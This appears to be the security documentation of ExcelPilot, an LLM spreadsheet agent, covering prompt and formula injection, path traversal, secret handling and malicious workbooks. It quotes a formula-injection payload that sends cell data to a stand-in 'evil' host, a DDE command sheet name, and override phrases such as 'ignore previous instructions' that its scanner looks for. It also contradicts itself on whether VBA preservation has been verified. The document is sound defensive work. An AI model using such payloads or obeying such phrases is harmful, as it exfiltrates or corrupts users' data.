# Security

What ExcelPilot defends against, how, and what remains open.

This document describes **behaviour that exists in the code**. Where a control is
partial, that is said plainly rather than implied.

## Threat model

The primary threat is not a network attacker. It is a **workbook or a request
that is trying to make ExcelPilot do something the operator did not intend** —
and, secondarily, the risk that a well-intentioned change silently damages
business data.

| Adversary | Capability assumed | Primary defence |
|---|---|---|
| **A malicious workbook** | Controls cell values, sheet names, comments, defined names, external links, and the OOXML package itself | Resource limits, hardened parsing, untrusted-text typing, injection scanning, formula-injection neutralisation |
| **A malicious or careless request** | Is the input to the planner | Typed contracts, `no_guessing` denial, policy, the approval gate |
| **A compromised or confused model** | Returns a hostile or wrong plan | The plan is a typed contract; policy is deterministic and re-evaluated at execution; the model has no mutation authority |
| **A hostile JEV response** | Returns malformed or extreme data | Response validated against the question set; unusable answers downgraded, never fatal |
| **An accidental overwrite** | Is a human error, not an attack | Source never opened for writing; versioned output; atomic writes |
| **A secret leaking into a log** | Is a configuration mistake | Redaction at write time; keys never logged, never in error bodies |

Explicitly **out of scope**: a local attacker with write access to the ExcelPilot
process, a malicious ExcelPilot configuration file, and host-level compromise.
Anyone who can edit the config can edit the policy thresholds; anyone who can
run code in the process can bypass all of this.

## Prompt injection

The core problem: a spreadsheet cell, a sheet name, or a comment can contain text
that reads like an instruction. If that text reaches a model in a position where
instructions are read, the model has been given orders by the document.

### How it is handled

1. **A distinct type.** Untrusted text is `UntrustedText`, not `str`. It carries
   its own `provenance` and is structurally separated from anything a prompt
   builds. The compiler catches the mistake of passing a bare string where
   untrusted content belongs.

2. **Size caps per provenance.** `limits.max_untrusted_chars` (4,000 by
   default), with `app/safety/injection.cap_for()` returning a tighter cap for
   lower-trust provenance. A 10 MB comment cannot become a 10 MB prompt.

3. **Scanning before every model call.** `app/safety/injection.py` scans for
   instruction-like content — "ignore previous instructions", "you are now",
   role markers, exfiltration framings — and records anomalies. A sheet named
   `=cmd|'/c calc'!A1` is data.

4. **Explicit data wrapping.** `wrap_as_data()` fences untrusted content inside a
   labelled, delimited block, so its content is visibly an argument rather than
   an instruction channel.

5. **The request itself is capped and typed.** The user's task arrives as
   `UntrustedText` with `provenance="user_task"`, not as a raw prompt.

6. **The model has no authority regardless.** This is the load-bearing defence.
   Even a fully successful injection produces a *plan*, and the plan is
   validated, policy-checked deterministically, and re-checked at execution. The
   worst an injection can achieve is a request for an operation that policy then
   evaluates on its merits.

The honest limit: **scanning is heuristic.** A sufficiently indirect injection may
not match any pattern. The system is designed so that matching is not the only
thing standing between an injection and a change.

## Formula injection

A string starting with `=`, `+`, `-`, or `@` that lands in a cell is interpreted
as a formula by Excel and, historically, has been used to exfiltrate data or
trigger DDE. The classic payload is `=HYPERLINK("http://evil?d="&A1,"click")`.

`app/safety/formula_guard.py`:

- `looks_like_formula(value)` — recognises the dangerous prefixes
- `neutralise(value)` — prefixes such a value so Excel treats it as text
- `neutralise_row(row)` — applies it across a row and returns how many cells
  were affected
- `describe(value)` — explains what was neutralised, for the report

`output.neutralize_formula_injection` is `True` by default. Neutralised cells
are counted and reported, so the change is visible rather than silent.

User-supplied sheet names are handled by `is_safe_name()` and `sanitise_name()`,
which strip characters that would let a name become a formula or a path
component.

## Path traversal

Every output path goes through `resolve_within(path, root)`, which resolves the
path and **rejects anything outside the workspace root** — including via `..`,
absolute paths, and symlinks, because resolution happens before the comparison.

This is enforced twice, deliberately:

- once by the `output_within_workspace` policy rule, before execution
- again by the executor's execution-time policy re-check

The second one is not redundant. During development, a run was correctly denied
at execution for an output path that had passed the earlier check — which is
exactly why defence in depth is worth the cost.

## Secret handling

- **No automatic `.env` loading.** Deliberate (ADR-0002): a `.env` file in the
  working directory must not be able to silently redirect traffic or supply
  keys. Credentials come from the process environment only.
- **Presence checks, never value reads.** Provider resolution checks whether a
  variable is *set*. Checking presence is not authentication — a key can be
  present and still be invalid or out of credit, and the code says so.
- **Keys never appear in errors.** `app/net/http.py` puts the key and the
  response body in no error message, because a provider error page can echo the
  request.
- **Redaction at write time.** Secrets are redacted in logs, audit records,
  manifests, and error messages as they are written — not on read. A secret that
  reaches a log is never written in the first place, so there is no window in
  which it sits on disk in the clear. See `app/audit/redaction.py`.
- **A malformed key is refused before sending.** A key containing any character
  outside printable ASCII is rejected rather than used to build an `Authorization`
  header, which prevents header injection.
- **No redirects.** `app/net/http.py` refuses every redirect. Following one is
  how a bearer token gets exfiltrated to a third party.

The benchmark harness additionally asserts that no secret-shaped material appears
in `benchmarks/results.json`, because that file is meant to be shareable.

## The JEV privacy boundary

The JEV payload is built by an **explicit allowlist** of fields in
`app/decisions/questions.py` — not by taking a workbook dump and redacting it.
Fields not on the list cannot be sent, which is a stronger property than a
redaction pass that has to anticipate every case.

Sent: `run_id`, `task_summary`, sheet count, sheet names, total row count,
hidden-sheet presence, operation kinds, cell/formula/record counts,
`structural_change`, ambiguity signals, and `capabilities`.

Not sent: cell values, formulas, cell addresses, sheet contents, workbook bytes,
file paths, credentials.

The **capability field is load-bearing**, not decorative. The `verification`
question's wording is derived from it: if the runtime can evaluate formulas, the
model is told so and asked for the strongest check. Getting this wrong had a real
consequence — the question once told the model ExcelPilot could not recalculate
formulas, which was false after recalculation was integrated, and would have had
the model pick a check weaker than the system can perform. `tests/test_jev_adapter.py`
asserts both wordings, so the two cannot drift apart.

## Malicious workbook handling

A workbook is a zip archive of XML, and both formats are attack surfaces.

### XML parsing is hardened — and that can be silently switched off

Every OOXML part openpyxl parses goes through **`defusedxml`**, which disables
entity expansion and external-entity resolution. Verified rather than assumed:
during a single `inspect_workbook` call on a small workbook, `defusedxml`'s
`fromstring` handled **55 of 55** XML parses.

The mechanism is worth knowing, because the protection is a *dependency of a
dependency* and can be turned off without any change to ExcelPilot:

- openpyxl sets `DEFUSEDXML = defusedxml_available() and defusedxml_env_set()`
- `defusedxml_env_set()` reads `OPENPYXL_DEFUSEDXML`, which **defaults to
  `"True"`**
- setting `OPENPYXL_DEFUSEDXML=False` makes openpyxl fall back to
  `xml.etree.ElementTree` — stdlib parsing with entity expansion enabled — and
  ExcelPilot will not notice

`defusedxml` is therefore declared as a **direct** dependency rather than left to
transitive resolution. Relying on openpyxl to pull it in would mean the security
property depends on a resolver decision, and removing the explicit declaration
would silently downgrade every parse. This was re-verified during the
release-hardening audit specifically because a naive search for
`import defusedxml` in `app/` returns nothing and makes the dependency look
unused.

**If you deploy ExcelPilot somewhere that sets `OPENPYXL_DEFUSEDXML=False`, you
have turned this off.** Resource limits still bound the blast radius, but the
entity-expansion defence is gone.

### Resource limits

Checked **before** the expensive work, not after.

| Control | Where | What it stops |
|---|---|---|
| Max file size | `limits.max_file_size_bytes` (256 MB) | Memory exhaustion |
| Max compression ratio | `limits.max_compression_ratio` (200) | Zip bombs — a 256 MB file that inflates to 50 GB |
| Max sheets | `limits.max_sheets` (512) | Sheet-count exhaustion |
| Max rows / columns per sheet | `limits.max_rows_per_sheet` (1,048,576), `max_columns_per_sheet` (16,384) | Declared-dimension bombs |
| Max total cells | `limits.max_total_cells` (20,000,000) | Aggregate memory exhaustion |
| Max formula count | `limits.max_formula_count` (2,000,000) | Formula-parsing cost |
| Path traversal on open | `app/safety/paths.py` | A workbook path escaping the workspace |
| Recursive zip entry names | `limits` | Zip entries with `../` paths |

## Authorisation

JEV is not an authorisation mechanism and cannot become one.

```
requires_approval = policy_requires OR jev_escalates
```

- A JEV answer of "yes, this is fine" cannot turn a policy denial into an allow.
- Any `needs_review` **raises** scrutiny. There is no de-escalation path.
- Upstream JEV itself emits `policy.executes_actions: false`, and states that
  none of its answers grants permission to execute.

The authorisation authority is the human at the approval gate plus the
deterministic policy engine. Nothing else.

## Safe output

- The source workbook is **never opened for writing**. The run works on a byte
  copy taken first.
- Output is a new, versioned path — `<stem>__<run-id>.xlsx` — which is always
  different from the source. That makes "never overwrite the original" a
  structural property rather than a policy check.
- Writes are atomic: written to a temporary file and renamed, so a crash cannot
  leave a half-written workbook.
- **Rollback is "discard the output"**, because nothing was overwritten. There is
  no undo to get wrong.
- The snapshot is a **byte copy**, not a re-save. openpyxl rewrites the OOXML
  package on every save, so a re-saved snapshot would differ from the original
  for reasons unrelated to the change.

## Macro-enabled workbooks

`.xlsm` files are read and preserved, never written. **All of this is now
measured** against a real 152 KB VBA project rather than asserted.

- The `vba_read_only` hard-deny rule blocks any write to a macro-enabled
  workbook. It is a **deny**, not an escalation: `--approve` does not override
  it, and no configuration file can disable it. Both properties are asserted by
  tests, including one that drives every soft threshold to its most permissive
  value and confirms the denial stands.
- `has_vba()` inspects the zip rather than trusting the extension, because a
  `.xlsm` saved without macros is common. Both directions are tested: a real
  project reports `True`, and a macro-free `.xlsm` reports `False`.
- `keep_vba=True` is enforced on the single load path, so no call site can
  forget it.
- `vbaProject.bin` is **preserved byte-for-byte** through a read/save round
  trip, verified by SHA-256 against a genuine 152,576-byte project.

Why the rule is a deny rather than an approval gate: openpyxl preserves the VBA
project but cannot reason about it. A mutation risks producing a workbook whose
macros no longer match its sheets — for example, a macro referencing a sheet or
range the change removed. A human approving it would be approving a risk nobody
can actually assess, because the tool cannot show what the macros do. Refusing
and saying so is the honest answer.

**One measured caveat, now detected.** openpyxl drops OOXML drawing and comment
parts on a round trip, so a shape bound to a macro — a button that invokes it —
and the user's cell comments are lost from the *output*. Verification now
compares the set of workbook parts before and after and **fails the run** when
content disappears, so a silent loss cannot be reported as success; the source is
untouched, so discarding the output loses nothing. The loss itself is an openpyxl
limitation and is not repaired. See [limitations.md](limitations.md) §3–4.

## There are no unsafe flags

No `--force`. No `--no-verify`. No `--skip-policy`. No `--overwrite`. No
`--in-place`.

A test asserts they do not exist. The absence of an escape hatch is only a real
property if something checks it, because the natural next change is to add one
"temporarily".

## What remains open

Stated plainly, because a security document that claims completeness is not
useful:

1. **Injection scanning is heuristic.** A sufficiently indirect injection may not
   match a pattern. The mitigation is structural — a model cannot mutate — not
   exhaustive detection.
2. **VBA preservation is unverified against a real macro project.** The
   `vba_read_only` rule prevents ExcelPilot from writing to such a workbook, so
   the risk is contained, but the read-path claim is untested against real VBA.
3. **The LLM planner was never run against a live provider.** It is
   contract-tested, but a live response could differ in ways the contract tests
   do not cover.
4. **openpyxl's XML parsing is not hardened against every malformed-package
   attack.** Resource limits bound the blast radius; they do not eliminate it.
5. **No authentication or multi-tenancy.** ExcelPilot runs as whoever runs it.
   There is no user model, no permission system, and no defence against a local
   attacker who can read the workspace.
6. **Resource limits are configurable.** A deliberately weakened limit is a
   deliberate decision by whoever controls the config.
